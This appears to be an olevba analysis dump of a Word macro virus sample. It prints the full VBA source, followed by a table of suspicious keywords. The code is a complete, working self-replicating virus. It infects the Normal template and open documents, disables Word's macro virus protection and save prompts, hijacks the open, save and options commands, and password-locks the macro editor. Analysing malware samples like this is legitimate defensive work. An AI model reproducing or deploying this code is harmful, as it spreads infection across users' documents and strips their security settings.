olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Officee.bas 
in file: Virus.MSWord.Shore.p - OLE stream: 'Macros/VBA/Officee'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'Fuck 4all Macro Viruses
'It's sign from TopHack0105
'Modify from "Offee" Create Dec 15'2000


Public Const SeriesNumber = 151200
Public Const ModuleName = "Officee", mw = "Microsoft Word", _
        TOP = "We R the best, U R Zero", _
        Hack0105 = "TopHack0105", _
        SerNum$ = "Series Number", _
        pass = "Enter password to modify Macros.", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const msg = "Password Wrong !", _
        aaa = "41240", bbb = "TopHack0105", ccc = "are", _
        mword = "Microsoft Word", _
        code = "oouu4515", ddd = "4155", eee = "Flowers"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

Sub checked()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub

Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next

    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="Zzzz", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub CopyNormal()
Dim ATemp As Template
    Scan
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub CopyDoc()
Dim Adoc As Document
    Scan
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

Sub AutoOpen()
    Scan
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("CopyDoc")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        CopyNormal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
        Scan
        WordBasic.DisableAutoMacros True
        WordCaption
    
        On Error Resume Next
        If Dialogs(wdDialogFileOpen).Show <> 0 Then
            AutoOpen
            On Error Resume Next
            ActiveDocument.Saved = True
            ActiveDocument.Save
        End If
        WordBasic.DisableAutoMacros False
    End Sub

Sub AutoClose()
    WordCaption
    Scan
    On Error Resume Next

    CopyDoc
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
words
Dim afn As String
    WordCaption
    WordBasic.DisableAutoMacros True
    
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    WordCaption
    WordBasic.DisableAutoMacros True
    
    CopyDoc
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub

Sub initial()
    Scan
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    initial
    Animated = False
    WordCaption
    CopyNormal
    If getInfected(NormalTemplate) Then CopyDoc
    ModifyAttr NormalTemplate.FullName
    checked
    For Each Combar In Application.CommandBars
        Combar.Reset
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    WordCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub NewDefault()
    WordCaption
    WordBasic.NewDefault
    CopyDoc
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        WordCaption
        CopyDoc
    End If
End Sub

Sub Scan()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoScan()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    initial
    NoScan
    On Error Resume Next
    ToolsOptionsDlg.Display
    WordCaption
    Scan
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbCritical, mword)
    WordCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cruel = aaa + Mid(code, 3, 6)
    If LCase(InputBox(pass, mword)) = cruel Then
        passDialog = True
    a = MsgBox("Congratulations Boss !", vbExclamation, "TopHack0105")
    Else
        NoAccess
    End If
End Function

Sub ToolsMacro()
a = MsgBox("Create Macro from Visual Basic Editor or Alt + F11", vbExclamation, mword)
End Sub

Sub FileTemplates()
    initial
    ToolsTemplatesDlg.Display

    WordCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    initial
    OrganizerDlg.Display
    WordCaption
End Sub

Sub FormatStyle()
    initial
    With FormatStyleDlg
        .Display
        .Execute
    End With
    WordCaption
End Sub

Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub WordCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = TOP
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub

Sub words()
On Error Resume Next
    If Day(Date) = 1 Then
    a = MsgBox("Have a nice day ...!", vbExclamation, mword)
        If Month(Date) = 5 Then
        a = MsgBox("Happy Birthday, Long Life ...!", vbExclamation, mword)
        End If
    End If
Return
End Sub

Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = TOP Then
            anCap = Hack0105
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Hack0105 Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = TOP
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

